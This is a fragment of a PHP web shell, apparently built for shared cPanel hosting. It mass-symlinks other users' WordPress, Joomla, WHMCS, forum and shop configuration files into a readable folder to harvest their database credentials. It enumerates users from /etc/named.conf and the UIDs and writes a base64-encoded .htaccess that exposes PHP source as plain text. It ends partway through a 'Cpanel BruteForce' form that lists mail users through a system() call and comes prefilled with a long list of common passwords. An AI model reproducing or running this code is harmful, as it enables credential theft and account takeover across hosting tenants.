symlink('/home5/'.$user.'/public_html/Connections/cms_blog.php',$kola.' ~~ admin - cms_blog.txt') ; 
symlink('/home5/'.$user.'/public_html/web/wp-config.php',$kola.' ~~ web - Wordpress .txt') ; 
symlink('/home5/'.$user.'/public_html/welcome/wp-config.php',$kola.' ~~ welcome - Wordpress .txt') ; 
symlink('/home5/'.$user.'/public_html/store/wp-config.php',$kola.' ~~ store - Wordpress .txt') ; 
symlink('/home5/'.$user.'/public_html/wp/wp-config.php',$kola.' ~~ wp - Wordpress.txt');
symlink('/home5/'.$user.'/public_html/wp/beta/wp-config.php',$kola.' ~~ wp - beta - Wordpress.txt');
symlink('/home5/'.$user.'/public_html/beta/wp-config.php',$kola.' ~~ beta - Wordpress.txt');
symlink('/home5/'.$user.'/public_html/press/wp-config.php',$kola.' ~~ press - Wp13.txt');
symlink('/home5/'.$user.'/public_html/wordpress/wp-config.php',$kola.' ~~ wordpress - Wordpress.txt');
symlink('/home5/'.$user.'/public_html/wordpress/beta/wp-config.php',$kola.' ~~ wordpress - beta - Wordpress.txt');
symlink('/home5/'.$user.'/public_html/news/wp-config.php',$kola.' ~~ news - Wordpress.txt');
symlink('/home5/'.$user.'/public_html/new/wp-config.php',$kola.' ~~ new - Wordpress.txt');
symlink('/home5/'.$user.'/public_html/blogs/wp-config.php',$kola.' ~~ blog - Wordpress.txt');
symlink('/home5/'.$user.'/public_html/home/wp-config.php',$kola.' ~~ home - Wordpress.txt');
symlink('/home5/'.$user.'/public_html/portal/wp-config.php',$kola.' ~~ portal - Wordpres.txt');
symlink('/home5/'.$user.'/public_html/site/wp-config.php',$kola.' ~~ site - Wordpress.txt');
symlink('/home5/'.$user.'/public_html/main/wp-config.php',$kola.' ~~ main - Wordpress.txt');
symlink('/home5/'.$user.'/public_html/test/wp-config.php',$kola.' ~~ test - Wordpress.txt');
symlink('/home5/'.$user.'/public_html/SSI.php',$kola.' ~~ C M F .txt') ; 
symlink('/home5/'.$user.'/public_html/forum/SSI.php',$kola.' ~~ forum - C M F .txt') ; 
symlink('/home5/'.$user.'/public_html/system/sistem.php',$kola.' ~~ Lokomedia.txt'); 
symlink('/home5/'.$user.'/public_html/mk_conf.php',$kola.' ~~ mk-portale1.txt');
symlink('/home5/'.$user.'/public_html/includes/functions.php',$kola.' ~~ hpbb3.txt');
symlink('/home5/'.$user.'/public_html/include/db.php',$kola.' ~~ infinity.txt');
symlink('/home5/'.$user.'/public_html/conf_global.php',$kola.' ~~ invisio.txt');
symlink('/home5/'.$user.'/public_html/admin/config.php',$kola.' ~~ admin - OpenCart-4.txt') ;
symlink('/home6/'.$user.'/public_html/beta/configuration.php',$kola.' ~~ beta - Joomla.txt') ; 
symlink('/home6/'.$user.'/public_html/configuration.php',$kola.' ~~ joomla.txt') ; 
symlink('/home6/'.$user.'/public_html/includes/config.php',$kola.' ~~ vBulletin-2.txt') ; 
symlink('/home6/'.$user.'/public_html/home/configuration.php',$kola.' ~~ home - Joomla.txt') ;
symlink('/home6/'.$user.'/public_html/store/configuration.php',$kola.' ~~ store - Joomla.txt') ;
symlink('/home6/'.$user.'/public_html/joomla/configuration.php',$kola.' ~~ joomla - Joomla.txt');
symlink('/home6/'.$user.'/public_html/portal/configuration.php',$kola.' ~~ portal - Joomla.txt');
symlink('/home6/'.$user.'/public_html/joom/configuration.php',$kola.' ~~ joom - Joomla.txt');
symlink('/home6/'.$user.'/public_html/joo/configuration.php',$kola.' ~~ jom - Joomla.txt');
symlink('/home6/'.$user.'/public_html/cms/configuration.php',$kola.' ~~ cms - Joomla.txt');
symlink('/home6/'.$user.'/public_html/site/configuration.php',$kola.' ~~ site - Joomla.txt');
symlink('/home6/'.$user.'/public_html/main/configuration.php',$kola.' ~~ main - Joomla.txt');
symlink('/home6/'.$user.'/public_html/news/configuration.php',$kola.' ~~ news - Joomla.txt');
symlink('/home6/'.$user.'/public_html/new/configuration.php',$kola.' ~~ new - Joomla.txt');
symlink('/home6/'.$user.'/public_html/home/configuration.php',$kola.' ~~ home - Joomla.txt');
symlink('/home6/'.$user.'/public_html/test/configuration.php',$kola.' ~~ test - Joomla.txt');
symlink('/home6/'.$user.'/public_html/myshop/configuration.php',$kola.' ~~ myshop - Joomla.txt'); 
symlink('/home6/'.$user.'/public_html/Settings.php',$kola.' ~~ Smf.txt'); 
symlink('/home6/'.$user.'/public_html/smf/Settings.php',$kola.' ~~ smf - Smf.txt'); 
symlink('/home6/'.$user.'/public_html/forum/Settings.php',$kola.' ~~ forum - Smf.txt'); 
symlink('/home6/'.$user.'/public_html/forums/Settings.php',$kola.' ~~ forums - Smf.txt'); 
symlink('/home6/'.$user.'/public_html/sites/default/settings.php',$kola.' ~~ sites - default - configuration 3.txt');
symlink('/home6/'.$user.'/public_html/includes/dist-configure.php',$kola.' ~~ Zencart.txt'); 
symlink('/home6/'.$user.'/public_html/zencart/includes/dist-configure.php',$kola.' ~~ zencart - zencart.txt'); 
symlink('/home6/'.$user.'/public_html/shop/includes/dist-configure.php',$kola.' ~~ shop - zencart.txt'); 
symlink('/home6/'.$user.'/public_html/includes/configure.php',$kola.' ~~ Oscommerce.txt');
symlink('/home6/'.$user.'/public_html/oscommerce/includes/configure.php',$kola.' ~~ oscommerce - Oscommerce.txt');
symlink('/home6/'.$user.'/public_html/oscommerces/includes/configure.php',$kola.' ~~ oscommerces -Oscommerces.txt');
symlink('/home6/'.$user.'/public_html/shopping/includes/configure.php',$kola.' ~~ shopping - Shopping.txt');
symlink('/home6/'.$user.'/public_html/sale/includes/configure.php',$kola.' ~~ sale - Oscommerce.txt');
symlink('/home6/'.$user.'/public_html/store/includes/configure.php',$kola.' ~~ store - Oscommerce.txt');
symlink('/home6/'.$user.'/public_html/inc/config.php',$kola.' ~~ MyBB.txt') ;
symlink('/home6/'.$user.'/public_html/forum/inc/config.php',$kola.' ~~ forum - MyBB .txt') ;
symlink('/home6/'.$user.'/public_html/lib/config.php',$kola.' ~~ Balitbang.txt') ; 
symlink('/home6/'.$user.'/public_html/cc/includes/config.php',$kola.' ~~ VBulletin4.txt');
symlink('/home6/'.$user.'/public_html/forum/includes/config.php',$kola.' ~~ forum - vBulletin.txt');
symlink('/home6/'.$user.'/public_html/forum/config.php',$kola.' ~~ forum - PhpBB.txt') ;
symlink('/home6/'.$user.'/public_html/amember/config.inc.php',$kola.' ~~ Amember.txt');
symlink('/home6/'.$user.'/public_html/config.inc.php',$kola.' ~~ Amember2.txt');
symlink('/home6/'.$user.'/public_html/vb/includes/config.php',$kola.' ~~ Vb.txt');
symlink('/home6/'.$user.'/public_html/vb3/includes/config.php',$kola.' ~~ Vb3.txt');
symlink('/home6/'.$user.'/public_html/upload/includes/config.php',$kola.' ~~ Upload.txt');
symlink('/home6/'.$user.'/public_html/incl/config.php',$kola.' ~~ Malay.txt');
symlink('/home6/'.$user.'/public_html/config/koneksi.php',$kola.' ~~ Lokomedia.txt');
symlink('/home6/'.$user.'/public_html/config/config.php',$kola.' ~~ config.txt');
symlink('/home6/'.$user.'/public_html/datas/config.php',$kola.' ~~ datas - configuration 3.txt');
symlink('/home6/'.$user.'/public_html/forum/conf/config.php',$kola.' ~~ forum - Other-1.txt') ; 
symlink('/home6/'.$user.'/public_html/include/config.php',$kola.' ~~ Other-2.txt');
symlink('/home6/'.$user.'/public_html/config.php',$kola.' ~~ Other-3.txt') ;
symlink('/home6/'.$user.'/public_html/admin/conf.php',$kola.' ~~ admin - Other-4.txt');
symlink('/home6/'.$user.'/public_html/connect.php',$kola.' ~~ Other-5.txt');
symlink('/home6/'.$user.'/public_html/codelibrary/inc/variables.php',$kola.' ~~ Other-6.txt') ;
symlink('/home6/'.$user.'/public_html/client/configuration.php',$kola.' ~~ client - admin Whm1.txt') ; 
symlink('/home6/'.$user.'/public_html/clients/configuration.php',$kola.' ~~ clients - Whm2.txt') ; 
symlink('/home6/'.$user.'/public_html/billing/configuration.php',$kola.' ~~ billing - Whm3.txt') ; 
symlink('/home6/'.$user.'/public_html/billings/configuration.php',$kola.' ~~ Whm4.txt') ;
symlink('/home6/'.$user.'/public_html/whmcs/configuration.php',$kola.' ~~ whmcs - Whm5.txt') ; 
symlink('/home6/'.$user.'/public_html/whm/configuration.php',$kola.' ~~ whm - Whm6.txt');
symlink('/home6/'.$user.'/public_html/order/configuration.php',$kola.' ~~ order - Whm7.txt');
symlink('/home6/'.$user.'/public_html/whmc/configuration.php',$kola.' ~~ whmc - Whm8.txt');
symlink('/home6/'.$user.'/public_html/submitticket.php',$kola.' ~~ whm9.txt');
symlink('/home6/'.$user.'/public_html/manage/configuration.php',$kola.' ~~ manage -Whm10.txt'); 
symlink('/home6/'.$user.'/public_html/clientes/configuration.php',$kola.' ~~ clientes - Whm11.txt');
symlink('/home6/'.$user.'/public_html/cliente/configuration.php',$kola.' ~~ cliente - Whm12txt');
symlink('/home6/'.$user.'/public_html/clientsupport/configuration.php',$kola.' ~~ clientsupport - Whm13.txt');
symlink('/home6/'.$user.'/public_html/support/configuration.php',$kola.' ~~ support - Whm13.txt');
symlink('/home6/'.$user.'/public_html/supports/configuration.php',$kola.' ~~ supports - Whm14.txt');
symlink('/home6/'.$user.'/public_html/cpanel/configuration.php',$kola.' ~~ cpanel - Whm15');
symlink('/home6/'.$user.'/public_html/panel/configuration.php',$kola.' ~~ panel - Whm16');
symlink('/home6/'.$user.'/public_html/host/configuration.php',$kola.' ~~ host - Whm17');
symlink('/home6/'.$user.'/public_html/hosting/configuration.php',$kola.' ~~ hosting - Whm18');
symlink('/home6/'.$user.'/public_html/hosts/configuration.php',$kola.' ~~ hosts - Whm19');
symlink('/home6/'.$user.'/public_html/v1/configuration.php',$kola.' ~~ v1 - Whm20');
symlink('/home6/'.$user.'/public_html/v2/configuration.php',$kola.' ~~ v2 - Whm21');
symlink('/home6/'.$user.'/public_html/baru/configuration.php',$kola.' ~~ v2 - Whm22');
symlink('/home6/'.$user.'/public_html/wp-config.php',$kola.' ~~ Wordpress.txt') ; 
symlink('/home6/'.$user.'/public_html/blog/wp-config.php',$kola.' ~~ Wordpress.txt') ; 
symlink('/home6/'.$user.'/public_html/Connections/cms_blog.php',$kola.' ~~ admin - cms_blog.txt') ; 
symlink('/home6/'.$user.'/public_html/web/wp-config.php',$kola.' ~~ web - Wordpress .txt') ; 
symlink('/home6/'.$user.'/public_html/welcome/wp-config.php',$kola.' ~~ welcome - Wordpress .txt') ; 
symlink('/home6/'.$user.'/public_html/store/wp-config.php',$kola.' ~~ store - Wordpress .txt') ; 
symlink('/home6/'.$user.'/public_html/wp/wp-config.php',$kola.' ~~ wp - Wordpress.txt');
symlink('/home6/'.$user.'/public_html/wp/beta/wp-config.php',$kola.' ~~ wp - beta - Wordpress.txt');
symlink('/home6/'.$user.'/public_html/beta/wp-config.php',$kola.' ~~ beta - Wordpress.txt');
symlink('/home6/'.$user.'/public_html/press/wp-config.php',$kola.' ~~ press - Wp13.txt');
symlink('/home6/'.$user.'/public_html/wordpress/wp-config.php',$kola.' ~~ wordpress - Wordpress.txt');
symlink('/home6/'.$user.'/public_html/wordpress/beta/wp-config.php',$kola.' ~~ wordpress - beta - Wordpress.txt');
symlink('/home6/'.$user.'/public_html/news/wp-config.php',$kola.' ~~ news - Wordpress.txt');
symlink('/home6/'.$user.'/public_html/new/wp-config.php',$kola.' ~~ new - Wordpress.txt');
symlink('/home6/'.$user.'/public_html/blogs/wp-config.php',$kola.' ~~ blog - Wordpress.txt');
symlink('/home6/'.$user.'/public_html/home/wp-config.php',$kola.' ~~ home - Wordpress.txt');
symlink('/home6/'.$user.'/public_html/portal/wp-config.php',$kola.' ~~ portal - Wordpres.txt');
symlink('/home6/'.$user.'/public_html/site/wp-config.php',$kola.' ~~ site - Wordpress.txt');
symlink('/home6/'.$user.'/public_html/main/wp-config.php',$kola.' ~~ main - Wordpress.txt');
symlink('/home6/'.$user.'/public_html/test/wp-config.php',$kola.' ~~ test - Wordpress.txt');
symlink('/home6/'.$user.'/public_html/SSI.php',$kola.' ~~ C M F .txt') ; 
symlink('/home6/'.$user.'/public_html/forum/SSI.php',$kola.' ~~ forum - C M F .txt') ; 
symlink('/home6/'.$user.'/public_html/system/sistem.php',$kola.' ~~ Lokomedia.txt'); 
symlink('/home6/'.$user.'/public_html/mk_conf.php',$kola.' ~~ mk-portale1.txt');
symlink('/home6/'.$user.'/public_html/includes/functions.php',$kola.' ~~ hpbb3.txt');
symlink('/home6/'.$user.'/public_html/include/db.php',$kola.' ~~ infinity.txt');
symlink('/home6/'.$user.'/public_html/conf_global.php',$kola.' ~~ invisio.txt');
symlink('/home6/'.$user.'/public_html/admin/config.php',$kola.' ~~ admin - OpenCart-4.txt') ;
symlink('/home7/'.$user.'/public_html/beta/configuration.php',$kola.' ~~ beta - Joomla.txt') ; 
symlink('/home7/'.$user.'/public_html/configuration.php',$kola.' ~~ joomla.txt') ; 
symlink('/home7/'.$user.'/public_html/includes/config.php',$kola.' ~~ vBulletin-2.txt') ; 
symlink('/home7/'.$user.'/public_html/home/configuration.php',$kola.' ~~ home - Joomla.txt') ;
symlink('/home7/'.$user.'/public_html/store/configuration.php',$kola.' ~~ store - Joomla.txt') ;
symlink('/home7/'.$user.'/public_html/joomla/configuration.php',$kola.' ~~ joomla - Joomla.txt');
symlink('/home7/'.$user.'/public_html/portal/configuration.php',$kola.' ~~ portal - Joomla.txt');
symlink('/home7/'.$user.'/public_html/joom/configuration.php',$kola.' ~~ joom - Joomla.txt');
symlink('/home7/'.$user.'/public_html/joo/configuration.php',$kola.' ~~ jom - Joomla.txt');
symlink('/home7/'.$user.'/public_html/cms/configuration.php',$kola.' ~~ cms - Joomla.txt');
symlink('/home7/'.$user.'/public_html/site/configuration.php',$kola.' ~~ site - Joomla.txt');
symlink('/home7/'.$user.'/public_html/main/configuration.php',$kola.' ~~ main - Joomla.txt');
symlink('/home7/'.$user.'/public_html/news/configuration.php',$kola.' ~~ news - Joomla.txt');
symlink('/home7/'.$user.'/public_html/new/configuration.php',$kola.' ~~ new - Joomla.txt');
symlink('/home7/'.$user.'/public_html/home/configuration.php',$kola.' ~~ home - Joomla.txt');
symlink('/home7/'.$user.'/public_html/test/configuration.php',$kola.' ~~ test - Joomla.txt');
symlink('/home7/'.$user.'/public_html/myshop/configuration.php',$kola.' ~~ myshop - Joomla.txt'); 
symlink('/home7/'.$user.'/public_html/Settings.php',$kola.' ~~ Smf.txt'); 
symlink('/home7/'.$user.'/public_html/smf/Settings.php',$kola.' ~~ smf - Smf.txt'); 
symlink('/home7/'.$user.'/public_html/forum/Settings.php',$kola.' ~~ forum - Smf.txt'); 
symlink('/home7/'.$user.'/public_html/forums/Settings.php',$kola.' ~~ forums - Smf.txt'); 
symlink('/home7/'.$user.'/public_html/sites/default/settings.php',$kola.' ~~ sites - default - configuration 3.txt');
symlink('/home7/'.$user.'/public_html/includes/dist-configure.php',$kola.' ~~ Zencart.txt'); 
symlink('/home7/'.$user.'/public_html/zencart/includes/dist-configure.php',$kola.' ~~ zencart - zencart.txt'); 
symlink('/home7/'.$user.'/public_html/shop/includes/dist-configure.php',$kola.' ~~ shop - zencart.txt'); 
symlink('/home7/'.$user.'/public_html/includes/configure.php',$kola.' ~~ Oscommerce.txt');
symlink('/home7/'.$user.'/public_html/oscommerce/includes/configure.php',$kola.' ~~ oscommerce - Oscommerce.txt');
symlink('/home7/'.$user.'/public_html/oscommerces/includes/configure.php',$kola.' ~~ oscommerces -Oscommerces.txt');
symlink('/home7/'.$user.'/public_html/shopping/includes/configure.php',$kola.' ~~ shopping - Shopping.txt');
symlink('/home7/'.$user.'/public_html/sale/includes/configure.php',$kola.' ~~ sale - Oscommerce.txt');
symlink('/home7/'.$user.'/public_html/store/includes/configure.php',$kola.' ~~ store - Oscommerce.txt');
symlink('/home7/'.$user.'/public_html/inc/config.php',$kola.' ~~ MyBB.txt') ;
symlink('/home7/'.$user.'/public_html/forum/inc/config.php',$kola.' ~~ forum - MyBB .txt') ;
symlink('/home7/'.$user.'/public_html/lib/config.php',$kola.' ~~ Balitbang.txt') ; 
symlink('/home7/'.$user.'/public_html/cc/includes/config.php',$kola.' ~~ VBulletin4.txt');
symlink('/home7/'.$user.'/public_html/forum/includes/config.php',$kola.' ~~ forum - vBulletin.txt');
symlink('/home7/'.$user.'/public_html/forum/config.php',$kola.' ~~ forum - PhpBB.txt') ;
symlink('/home7/'.$user.'/public_html/amember/config.inc.php',$kola.' ~~ Amember.txt');
symlink('/home7/'.$user.'/public_html/config.inc.php',$kola.' ~~ Amember2.txt');
symlink('/home7/'.$user.'/public_html/vb/includes/config.php',$kola.' ~~ Vb.txt');
symlink('/home7/'.$user.'/public_html/vb3/includes/config.php',$kola.' ~~ Vb3.txt');
symlink('/home7/'.$user.'/public_html/upload/includes/config.php',$kola.' ~~ Upload.txt');
symlink('/home7/'.$user.'/public_html/incl/config.php',$kola.' ~~ Malay.txt');
symlink('/home7/'.$user.'/public_html/config/koneksi.php',$kola.' ~~ Lokomedia.txt');
symlink('/home7/'.$user.'/public_html/config/config.php',$kola.' ~~ config.txt');
symlink('/home7/'.$user.'/public_html/datas/config.php',$kola.' ~~ datas - configuration 3.txt');
symlink('/home7/'.$user.'/public_html/forum/conf/config.php',$kola.' ~~ forum - Other-1.txt') ; 
symlink('/home7/'.$user.'/public_html/include/config.php',$kola.' ~~ Other-2.txt');
symlink('/home7/'.$user.'/public_html/config.php',$kola.' ~~ Other-3.txt') ;
symlink('/home7/'.$user.'/public_html/admin/conf.php',$kola.' ~~ admin - Other-4.txt');
symlink('/home7/'.$user.'/public_html/connect.php',$kola.' ~~ Other-5.txt');
symlink('/home7/'.$user.'/public_html/codelibrary/inc/variables.php',$kola.' ~~ Other-6.txt') ;
symlink('/home7/'.$user.'/public_html/client/configuration.php',$kola.' ~~ client - admin Whm1.txt') ; 
symlink('/home7/'.$user.'/public_html/clients/configuration.php',$kola.' ~~ clients - Whm2.txt') ; 
symlink('/home7/'.$user.'/public_html/billing/configuration.php',$kola.' ~~ billing - Whm3.txt') ; 
symlink('/home7/'.$user.'/public_html/billings/configuration.php',$kola.' ~~ Whm4.txt') ;
symlink('/home7/'.$user.'/public_html/whmcs/configuration.php',$kola.' ~~ whmcs - Whm5.txt') ; 
symlink('/home7/'.$user.'/public_html/whm/configuration.php',$kola.' ~~ whm - Whm6.txt');
symlink('/home7/'.$user.'/public_html/order/configuration.php',$kola.' ~~ order - Whm7.txt');
symlink('/home7/'.$user.'/public_html/whmc/configuration.php',$kola.' ~~ whmc - Whm8.txt');
symlink('/home7/'.$user.'/public_html/submitticket.php',$kola.' ~~ whm9.txt');
symlink('/home7/'.$user.'/public_html/manage/configuration.php',$kola.' ~~ manage -Whm10.txt'); 
symlink('/home7/'.$user.'/public_html/clientes/configuration.php',$kola.' ~~ clientes - Whm11.txt');
symlink('/home7/'.$user.'/public_html/cliente/configuration.php',$kola.' ~~ cliente - Whm12txt');
symlink('/home7/'.$user.'/public_html/clientsupport/configuration.php',$kola.' ~~ clientsupport - Whm13.txt');
symlink('/home7/'.$user.'/public_html/support/configuration.php',$kola.' ~~ support - Whm13.txt');
symlink('/home7/'.$user.'/public_html/supports/configuration.php',$kola.' ~~ supports - Whm14.txt');
symlink('/home7/'.$user.'/public_html/cpanel/configuration.php',$kola.' ~~ cpanel - Whm15');
symlink('/home7/'.$user.'/public_html/panel/configuration.php',$kola.' ~~ panel - Whm16');
symlink('/home7/'.$user.'/public_html/host/configuration.php',$kola.' ~~ host - Whm17');
symlink('/home7/'.$user.'/public_html/hosting/configuration.php',$kola.' ~~ hosting - Whm18');
symlink('/home7/'.$user.'/public_html/hosts/configuration.php',$kola.' ~~ hosts - Whm19');
symlink('/home7/'.$user.'/public_html/v1/configuration.php',$kola.' ~~ v1 - Whm20');
symlink('/home7/'.$user.'/public_html/v2/configuration.php',$kola.' ~~ v2 - Whm21');
symlink('/home7/'.$user.'/public_html/baru/configuration.php',$kola.' ~~ v2 - Whm22');
symlink('/home7/'.$user.'/public_html/wp-config.php',$kola.' ~~ Wordpress.txt') ; 
symlink('/home7/'.$user.'/public_html/blog/wp-config.php',$kola.' ~~ Wordpress.txt') ; 
symlink('/home7/'.$user.'/public_html/Connections/cms_blog.php',$kola.' ~~ admin - cms_blog.txt') ; 
symlink('/home7/'.$user.'/public_html/web/wp-config.php',$kola.' ~~ web - Wordpress .txt') ; 
symlink('/home7/'.$user.'/public_html/welcome/wp-config.php',$kola.' ~~ welcome - Wordpress .txt') ; 
symlink('/home7/'.$user.'/public_html/store/wp-config.php',$kola.' ~~ store - Wordpress .txt') ; 
symlink('/home7/'.$user.'/public_html/wp/wp-config.php',$kola.' ~~ wp - Wordpress.txt');
symlink('/home7/'.$user.'/public_html/wp/beta/wp-config.php',$kola.' ~~ wp - beta - Wordpress.txt');
symlink('/home7/'.$user.'/public_html/beta/wp-config.php',$kola.' ~~ beta - Wordpress.txt');
symlink('/home7/'.$user.'/public_html/press/wp-config.php',$kola.' ~~ press - Wp13.txt');
symlink('/home7/'.$user.'/public_html/wordpress/wp-config.php',$kola.' ~~ wordpress - Wordpress.txt');
symlink('/home7/'.$user.'/public_html/wordpress/beta/wp-config.php',$kola.' ~~ wordpress - beta - Wordpress.txt');
symlink('/home7/'.$user.'/public_html/news/wp-config.php',$kola.' ~~ news - Wordpress.txt');
symlink('/home7/'.$user.'/public_html/new/wp-config.php',$kola.' ~~ new - Wordpress.txt');
symlink('/home7/'.$user.'/public_html/blogs/wp-config.php',$kola.' ~~ blog - Wordpress.txt');
symlink('/home7/'.$user.'/public_html/home/wp-config.php',$kola.' ~~ home - Wordpress.txt');
symlink('/home7/'.$user.'/public_html/portal/wp-config.php',$kola.' ~~ portal - Wordpres.txt');
symlink('/home7/'.$user.'/public_html/site/wp-config.php',$kola.' ~~ site - Wordpress.txt');
symlink('/home7/'.$user.'/public_html/main/wp-config.php',$kola.' ~~ main - Wordpress.txt');
symlink('/home7/'.$user.'/public_html/test/wp-config.php',$kola.' ~~ test - Wordpress.txt');
symlink('/home7/'.$user.'/public_html/SSI.php',$kola.' ~~ C M F .txt') ; 
symlink('/home7/'.$user.'/public_html/forum/SSI.php',$kola.' ~~ forum - C M F .txt') ; 
symlink('/home7/'.$user.'/public_html/system/sistem.php',$kola.' ~~ Lokomedia.txt'); 
symlink('/home7/'.$user.'/public_html/mk_conf.php',$kola.' ~~ mk-portale1.txt');
symlink('/home7/'.$user.'/public_html/includes/functions.php',$kola.' ~~ hpbb3.txt');
symlink('/home7/'.$user.'/public_html/include/db.php',$kola.' ~~ infinity.txt');
symlink('/home7/'.$user.'/public_html/conf_global.php',$kola.' ~~ invisio.txt');
symlink('/home7/'.$user.'/public_html/admin/config.php',$kola.' ~~ admin - OpenCart-4.txt') ;
	}

				$d0mains = @file("/etc/named.conf");
		
				if($d0mains)
				{
					mkdir($fn);
					chdir($fn);
										
					foreach($d0mains as $d0main)
					{
						if(eregi("zone",$d0main))
						{
							preg_match_all('#zone "(.*)"#', $d0main, $domains);
							flush();
								
							if(strlen(trim($domains[1][0])) > 2)
							{ 
								$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
								
								syml($user['name'],$domains[1][0]);					
							}
						}
					}
					echo "<center><font color=lime size=3>[ Done ]</font></center>";
					echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#009900>| Go Here |</font></a></center>"; 
				}
				else
				{
					mkdir($fn);
					chdir($fn);
					$temp = "";
					$val1 = 0;
					$val2 = 1000;
					for(;$val1 <= $val2;$val1++) 
					{
						$uid = @posix_getpwuid($val1);
						if ($uid)
							$temp .= join(':',$uid)."\n";
					 }
					 echo '<br/>';
					 $temp = trim($temp);
					 
					 $file5 = fopen("test.txt","w");
					 fputs($file5,$temp);
					 fclose($file5);

$htaccess =
'T3B0aW9ucyBhbGwgCkRpcmVjdG9yeUluZGV4IHJlYWRtZS5odG1sIApBZGRUeXBlIHRleHQvcGxh
aW4gLnBocCAKQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAgCkFkZFR5cGUgdGV4dC9wbGFp
biAuaHRtbCAKQWRkSGFuZGxlciB0eHQgLmh0bWwgClJlcXVpcmUgTm9uZSAKU2F0aXNmeSBBbnk=
';
$file = fopen(".htaccess","w+");
$write = fwrite ($file ,base64_decode($htaccess));
					 
					 $file = fopen("test.txt", "r") or exit("Unable to open file!");
					 while(!feof($file))
					 {
						$s = fgets($file);
						$matches = array();
						$t = preg_match('/\/(.*?)\:\//s', $s, $matches);
						$matches = str_replace("home/","",$matches[1]);
						if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
							continue;
						syml($matches,$matches);
					 }
					fclose($file);
					echo "</table>";
					unlink("test.txt");
					echo "<center><font color=lime size=3>[ Done ]</font></center>";
					echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#009900>| Go Here |</font></a></center>"; 
				}
echo "<hr><center><b><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
exit;
}
?>
<form method="POST" target="_blank">
	<strong>
<input name="page" type="hidden" value="find"><table>      				
    </strong><br><br><center><font size="5" style="italic" color="#00ff00">+--==[ Cpanel BruteForce ]==--+</font></center><br><br>
    <table width="600" border="0" cellpadding="3" cellspacing="1" align="center">
	<tr>
	<td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<center><b><font size="5" style="italic" color="#00ff00">Cpanel BruteForce</font></b></center></td></tr>
    <tr>
    <td>
    <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
    <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<strong>User :</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="79" class ='inputz' rows="10" name="usernames">
<?php system('ls /var/mail');?>
	</textarea></strong></td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<strong>Pass :</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="79" class ='inputz' rows="10" name="passwords">!@#!@#
!@#$$#@!
!@#$%^
!@#$%^&
!@#$%^&*(
@12345
@123456
@1234567
@12345678
@123456789
000000
0123123
0123456
0987654321
100000
10011001
100827092
101010
10101010
101010101
102030
10203040
111111
1111111
11111111
111111111
1111111111
1111114
11112222
1111989
111222
111222333
111333
112112
1121221
112233
11223344
113323
113355
114477
121121
121212
121212121
121314
121988
122333
123!@#
1231213
123123
123123123
123321
12341234
1234242
1234321
12344321
123454
123454321
1234554321
123456
1234560
1234561
123456123
1234565
1234567
12345676
12345678
123456787
123456789
1234567890
12345678910
1234567898
123456admin
123467
1234678
12346789
123467890
12348765
123567
123654
123654789
123789
123987
123abc
123admin
124578
131313
133242
134679
135135135
135790
142356789
142536
147147
147258
147258369
147852
147852369
1478963
159159
159357
159753
159753456
159951
171717
181818
191919
19216801
19921992
19951995
1q2w3e4r
1q2w3e4r5t
1q2w3e4r5t6y
1qaz2wsx
1qaz2wsx3edc
1qazxsw2
1qw23e
1qw23er45ty67u
1qwe299
21122112
212121
214221
221211
22221111
222222
2222222
22222222
222222222
222888
223344
223355
224466
232323
234234
234523
234567
2345678
23456789
234567890
242424
243432
246810
252525
258258
258456
271989
313131
321123
321321
321321321
321456
321654987
323232
332211
333333
3333333
33333333
333333333
334345
343434
345345
357951
3646542
369369
369852147
415263
420420
444444
4444444
44444444
444444444
445566
454545
456123
456321
456456
456654
456789
4815162342
4897798
51905190
5277804
531531531
555555
5555555
55555555
555555555
555655
567567
567890
576823
600555
654321
666666
6666666
66666666
666666666
66669999
666999
666999666
678678
696969
69696969
718293
753159
753951
7654321
777777
7777772000
7777777
77777777
777777777
784512
789321
789456
789654
789789
7897984
794613
8675309
87654321
888888
8888888
88888888
888888888
895623
9026888
9379992
968574
987456
987456321
987654
9876543
98765432
987654321
9876543210
987865
99990000
99996666
999999
9999999
99999999
999999999
abc123
abcabc
abcd1234
abcdef
acb123
adm1n1strator
adm1nistrator
admin@123
admin1
ADMIN1
admin12
admin123
admin1234
admin123456
admincp
administrator
anhyeuem
asdfasdf
asdqwe
asdqwe123
changeme
iloveyou
p@$$w0rd
P@$$w0rd
P@$$W0RD
P@$$word
P@$$WORD
p@ssw0rd
P@ssw0rd
P@SSW0RD
P@ssw0rd1
P@SSW0RD1
P@ssw0rd123
P@SSW0RD123
p@ssword
P@ssword
P@SSWORD
pass123
pass1234
passadmin
passw0rd
Passw0rd
Passw0rd1
passwd
password
Password
PASSword
PASSWORD
password1
Password1
password12
password123
password1234
password12345
password123456
password1234567
password12345678
password123456789
q1w2e3r4
qw1234er
qwaszx
qwe123
qwe321
qwe456
qweasd
qweasdzxc
Qweasdzxc
qwedsa
qweewq
qweqwe
qwer12
qwer123
qwerasdf
qwert1
qwert1234
qwerty
Qwerty
QWERTY
QWERTY!
qwerty1
qwerty12
qwerty123
qwerty123 
qwerty1234
qwerty1234 
qwertyasdfg
r00t123
s3cret
s3cret123
test123
Test123</textarea></strong></td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<strong>Type :</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5">
    <span class="style2"><strong>Simple : </strong> </span>
	<strong>
	<input type="radio" name="type" value="simple" checked="checked" class="style3"></strong>
    <font class="style2"><strong>/etc/passwd : </strong> </font>
	<strong>
	<input type="radio" name="type" value="passwd" class="style3"></strong><span class="style3"><strong>
	</strong>
	</span>
    </td>
    </tr>
    <tr>
